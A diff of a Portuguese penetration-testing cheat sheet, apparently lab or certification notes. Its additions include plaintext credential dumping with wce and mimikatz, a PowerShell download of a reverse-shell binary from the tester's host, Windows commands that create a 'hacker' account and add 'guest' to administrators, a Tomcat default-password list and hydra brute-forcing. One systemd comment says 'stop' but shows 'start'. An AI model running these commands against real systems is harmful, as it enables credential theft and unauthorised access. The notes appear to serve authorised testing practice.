@@ -113,17 +113,31 @@ rename arquivo.txt novo_diretorio/arquivo.txt
 5. mput
 	Descrição: Envia múltiplos arquivos do diretório local para o servidor FTP.
 
+## configuração do servidor ftp
+verifica se já está instalado
+```
+dpkg -l | grep -E 'vsftpd|proftpd|pure-ftpd'
+```
 
-## ftp (passivo x ativo)
-referencial é o servidor
-- No modo FTP passivo o servidor fica escutando enquanto aguarda a conexão do cliente. 
-- No modo FTP ativo, o cliente fica escutando enquanto aguarda a conexão do servidor.
+instala:
+```
+sudo apt install vsftpd
+```
 
-Modo Passivo:
-    No modo passivo, o cliente estabelece tanto a conexão de controle (porta 21) quanto a conexão de dados. Após estabelecer a conexão de controle, o cliente solicita ao servidor uma porta para a conexão de dados. O servidor então informa ao cliente qual porta ele (o servidor) está escutando para a conexão de dados (geralmente uma porta acima de 1023). O cliente, então, abre uma conexão para essa porta no servidor.
+inicia o servidor ftp
+```
+sudo systemctl start vsftpd
+```
 
-Modo Ativo:
-    No modo ativo, o cliente estabelece a conexão de controle com o servidor na porta 21. Quando é necessário transferir dados, o cliente informa ao servidor qual porta ele (o cliente) está escutando para a conexão de dados (normalmente uma porta acima de 1023). O servidor então abre uma conexão a partir de sua porta 20 para a porta especificada pelo cliente.
+diretório raiz do servidor FTP
+```
+/srv/ftp
+```
+
+arquivo de configuração
+```
+/etc/vsftpd.conf
+```
 
 
 
@@ -880,6 +894,13 @@ hashcat -m 1000 hash_formatada.txt WORDLIST
 /usr/share/windows-binaries/fgdump/fgdump.exe
 ```
 
+extração de senhas em texto plano
+```
+wce.exe -w
+```
+O parâmetro `-w` ativa a busca por senhas em texto claro armazenadas no Digest Authentication Package.
+
+
 mimikatz para pegar credenciais
 ```
 wdigest
@@ -1076,7 +1097,7 @@ xfreerdp /v:10.10.39.3 /u:Administrator /p:letmein123!
 
 
 # powershell
-transferencia do arquivo rev
+transferencia do arquivo rev via powershell
 ```
 Invoke-WebRequest -Uri http://<meu_ip>:PORT/rev.exe -OutFile "C:\PATH"
 
@@ -1712,15 +1733,16 @@ searchsploit ipfire --id -m <exploit_ID>
 
 # container
 ## Comandos Básicos de Contêiner
-| Comando | Descrição | Exemplo |
-|---------|-----------|---------|
-| `docker ps` | Lista containers ativos | `docker ps` |
-| `docker ps -a` | Lista todos containers | `docker ps -a` |
-| `docker start <container>` | Inicia container | `docker start gitea` |
-| `docker stop <container>` | Para container | `docker stop gitea` |
-| `docker restart <container>` | Reinicia container | `docker restart gitea` |
-| `docker rm <container>` | Remove container | `docker rm gitea` |
-| `docker rm -f <container>` | Remove forçadamente | `docker rm -f gitea` |
+| Comando                                                 | Descrição                    | Exemplo                                      |
+| ------------------------------------------------------- | ---------------------------- | -------------------------------------------- |
+| `docker ps`                                             | Lista containers ativos      | `docker ps`                                  |
+| `docker ps -a`                                          | Lista todos containers       | `docker ps -a`                               |
+| `docker start <container>`                              | Inicia container             | `docker start gitea`                         |
+| `docker stop <container>`                               | Para container               | `docker stop gitea`                          |
+| `docker restart <container>`                            | Reinicia container           | `docker restart gitea`                       |
+| `docker rm <container>`                                 | Remove container             | `docker rm gitea`                            |
+| `docker rm -f <container>`                              | Remove forçadamente          | `docker rm -f gitea`                         |
+| `sudo docker exec -it <container-id-ou-nome> /bin/bash` | Acessa terminal do container | `sudo docker exec -it tomcat7_alt /bin/bash` |
 ## Monitoramento e Logs
 | Comando | Descrição | Exemplo |
 |---------|-----------|---------|
@@ -1740,11 +1762,11 @@ searchsploit ipfire --id -m <exploit_ID>
 | `docker exec -it <container> bash` | Acessa terminal | `docker exec -it gitea bash` |
 | `docker run -it <imagem> sh` | Container temporário | `docker run -it alpine sh` |
 ## Docker Compose
-| Comando | Descrição | Exemplo |
-|---------|-----------|---------|
+| Comando                | Descrição       | Exemplo                |
+| ---------------------- | --------------- | ---------------------- |
 | `docker-compose up -d` | Inicia serviços | `docker-compose up -d` |
-| `docker-compose down` | Para e remove | `docker-compose down` |
-| `docker-compose logs` | Mostra logs | `docker-compose logs` |
+| `docker-compose down`  | Para e remove   | `docker-compose down`  |
+| `docker-compose logs`  | Mostra logs     | `docker-compose logs`  |
 ## Backup e Limpeza
 | Comando                                | Descrição      | Exemplo                          |
 | -------------------------------------- | -------------- | -------------------------------- |
@@ -2203,6 +2225,11 @@ ffuf -u 'example.com' -w wordlist.txt -mc 400,401
 ## metodos aceitos (get, put, options, head,post)
 - validar os métodos aceitos em cada um dos diretórios da aplicação
 
+nmap
+```
+nmap -p <HTTP_PORT> --script http-methods <TARGET_IP>
+```
+
 **curl**
 ```
 curl -v -X options <URL>
@@ -2651,7 +2678,8 @@ curl http://IP/file.exe -o file.exe
 
 ### via ftp
 o utilitário ftp do windows tem a flag `-s` que permite usarmos um arquivo .txt para especificar os comandos ftp que serão executados. Assim criamos o arquivo ftp.txt com as instruções que desejamos para baixar o arquivo do nosso servidor ftp
-ftp.txt
+
+arquivo `ftp.txt`
 ```
 open IP
 USER anonymous
@@ -2680,13 +2708,13 @@ programa transforma binário em hexadecimal
    ```
    exe2hex -x file.exe -p file.txt
    ```
-   poderiamos trocar a flag `-p` (powershell) para `-b` batch (sistemas antigos)
+   para windows mais antigos, substituiriamos a flag `-p` (powershell) para `-b` batch (sistemas antigos)
     `-b` BAT      BAT output file (DEBUG.exe method - x86)
 	`-p` POSH     PoSh output file (PowerShell method - x86/x64)
 
 3. copia o conteudo do plink.txt
    ```
-   cat plink.txt | toclip
+   cat file.txt | toclip
    ```
 4. Reconstrói o arquivo na máquina alvo pelo terminal
    ```
@@ -2754,7 +2782,7 @@ executar plink na servidor alvo
 
 
 ## Privilege escalation
-### windows
+### windows  commands
 
 ativa o usuário guest
 ```
@@ -2774,6 +2802,42 @@ mostra os grupos do usuario
 whoami /groups
 net user [USER]
 ```
+
+cria um usuário
+```
+net user <username> <password> /add
+net user hacker Pass123 /add
+
+# cria usuario sem senha
+net user <nome_do_usuario> "" /add
+net user hacker "" /add # cuidado que por motivos de segurança o RDP não permite login de usuários sem senha
+```
+
+adiciona usuario a um grupo
+```
+net localgroup <group_name> <user> /add
+net localgroup administrators guest /add
+net localgroup "Remote Desktop Users" guest /add
+```
+
+exibe lista de membros do grupo
+```
+net localgroup <group_name>
+net localgroup administrators
+```
+
+ativa um usuário
+```
+net user <user> /active:yes
+net user guest /active:yes
+```
+
+muda senha do usuário
+```
+net user <user> <senha>
+net user guest <senha>
+```
+
 
 exibe todos os usuários
 ```
@@ -3062,6 +3126,25 @@ echo "/bin/bash -p" > cat && chmod 777 cat
 ./script_vulneravel # executar script (com SUID) vulneravel a PATH Hijacking
 ```
 
+## serviços 
+(`start x enable` e `stop x disable`)
+```
+# verifica status do serviço
+sudo systemctl status vsftpd
+
+# iniciar o serviço agora
+sudo systemctl start vsftpd
+
+# para a execução do serviço agora
+sudo systemctl start vsftpd
+
+# serviço inicia com o boot
+sudo systemctl enable vsftpd
+
+# serviço desabilitado com o boot
+sudo systemctl disable vsftpd
+```
+
 
 ## Pivoting
 https://www.offsec.com/metasploit-unleashed/pivoting/
@@ -3103,16 +3186,16 @@ Links importantes
 ## ColdFusion
 default paths
 
-|Caminho|Descrição|
-|---|---|
-|`/CFIDE/`|**Diretório administrativo padrão.** Contém ferramentas administrativas, scripts, templates e utilitários.|
-|`/CFIDE/administrator/`|**Painel de administração do ColdFusion.** Acesso via web. Se estiver exposto, é crítico.|
-|`/CFIDE/componentutils/`|Ferramentas de depuração e verificação de componentes.|
-|`/CFIDE/scripts/`|Scripts auxiliares utilizados por aplicações ColdFusion.|
-|`/CFIDE/administrator/enter.cfm`|Página de login do administrador ColdFusion.|
-|`/cfdocs/` ou `/CFDOCS/`|Documentação padrão do ColdFusion (se estiver instalada).|
-|`/cfusion/`|Caminho comum na estrutura de arquivos do servidor (nível de sistema, não necessariamente via web).|
-O path `ColdFusion8\lib\password.properties` armazena a hash do admin
+| Caminho                          | Descrição                                                                                                  |
+| -------------------------------- | ---------------------------------------------------------------------------------------------------------- |
+| `/CFIDE/`                        | **Diretório administrativo padrão.** Contém ferramentas administrativas, scripts, templates e utilitários. |
+| `/CFIDE/administrator/`          | **Painel de administração do ColdFusion.** Acesso via web. Se estiver exposto, é crítico.                  |
+| `/CFIDE/componentutils/`         | Ferramentas de depuração e verificação de componentes.                                                     |
+| `/CFIDE/scripts/`                | Scripts auxiliares utilizados por aplicações ColdFusion.                                                   |
+| `/CFIDE/administrator/enter.cfm` | Página de login do administrador ColdFusion.                                                               |
+| `/cfdocs/` ou `/CFDOCS/`         | Documentação padrão do ColdFusion (se estiver instalada).                                                  |
+| `/cfusion/`                      | Caminho comum na estrutura de arquivos do servidor (nível de sistema, não necessariamente via web).        |
+O path `ColdFusion8\lib\password.properties` armazena a **hash `md5`** do admin
 ```
 ColdFusion8\lib>type password.properties
 #Thu Mar 05 17:40:39 PST 2020
@@ -3120,6 +3203,32 @@ rdspassword=
 password=86C16A459ECF39FD76A8E750F9D5074C4722F22B
 encrypted=true
 ```
+
+## Tomcat
+wordlist com usuário e senha
+```
+seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+
+# conteudo
+tomcat:advagrant
+tomcat:changethis
+tomcat:password
+tomcat:password1
+tomcat:s3cret
+tomcat:tomcat
+xampp:xampp
+server_admin:owaspbwa
+admin:owaspbwa
+demo:demo
+
+```
+
+brutar login page do tomcat 
+```
+hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://172.16.1.156:8080/manager/html
+
+```
+- `-C FILE` --> colon separated "login:pass" format, instead of -L/-P options
 
 # relatório
 salvar os comandos do terminal e suas respectivas saidas
